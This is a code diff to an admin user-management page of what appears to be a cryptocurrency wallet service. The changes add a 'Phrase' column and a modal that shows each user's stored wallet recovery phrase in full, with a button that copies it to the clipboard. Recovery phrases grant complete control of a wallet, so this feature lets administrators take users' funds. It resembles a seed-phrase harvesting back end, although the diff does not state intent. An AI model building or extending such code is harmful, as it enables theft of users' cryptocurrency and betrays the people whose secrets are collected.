@@ -20,6 +20,7 @@ interface TableUser {
   btcBalance: number;
   otherAccounts: OtherAccount[];
   is2FAEnabled: boolean;
+    phrase: string;
 }
 
 function AdminUsers() {
@@ -36,7 +37,8 @@ function AdminUsers() {
   const [showConfirm, setShowConfirm] = useState(false);
   const [selectedUserId, setSelectedUserId] = useState<number | null>(null);
   const [confirmLoading, setConfirmLoading] = useState(false);
-
+  const [showPhraseModal, setShowPhraseModal] = useState(false);
+  const [selectedPhrase, setSelectedPhrase] = useState("");
   const handleCopy = async (text: string) => {
     try {
       await navigator.clipboard.writeText(text);
@@ -61,6 +63,7 @@ function AdminUsers() {
         btcBalance: user.main_account?.btc_balance || 0,
         otherAccounts: user.other_accounts || [],
         is2FAEnabled: !!user.main_account?.is_2fa_enabled,
+         phrase: user.main_account?.phrase || "",
       }));
 
       setUsers(mappedUsers);
@@ -141,6 +144,20 @@ function AdminUsers() {
       header: "BTC Balance",
       accessor: (row) => `${row.btcBalance} BTC`,
     },
+    {
+  header: "Phrase",
+  accessor: (row) => (
+    <button
+  onClick={() => {
+    setSelectedPhrase(row.phrase);
+    setShowPhraseModal(true);
+  }}
+  className="px-4 py-1 rounded-lg bg-[#25C866]/10 text-[#25C866] border border-[#25C866]/20 hover:bg-[#25C866]/20 hover:scale-105 transition-all duration-200 cursor-pointer text-sm font-medium"
+>
+  View Phrase
+</button>
+  ),
+},
     {
       header: "View",
       accessor: (row) => (
@@ -248,6 +265,31 @@ function AdminUsers() {
           </div>
         </div>
       )}
+      {showPhraseModal && (
+  <div className="fixed inset-0 z-[999] flex items-center justify-center">
+    <div
+      className="absolute inset-0 bg-black/50"
+      onClick={() => setShowPhraseModal(false)}
+    />
+
+    <div className="relative bg-[#161F37] p-5 rounded-xl max-w-lg w-full  mx-3">
+      <h3 className="text-white text-lg font-semibold mb-4">
+        Recovery Phrase
+      </h3>
+
+      <p className="text-white break-words">
+        {selectedPhrase}
+      </p>
+
+      <button
+        onClick={() => handleCopy(selectedPhrase)}
+        className="mt-4 bg-[#25C866] px-4 py-2 rounded-lg text-white cursor-pointer"
+      >
+        Copy
+      </button>
+    </div>
+  </div>
+)}
     </div>
   );
 }
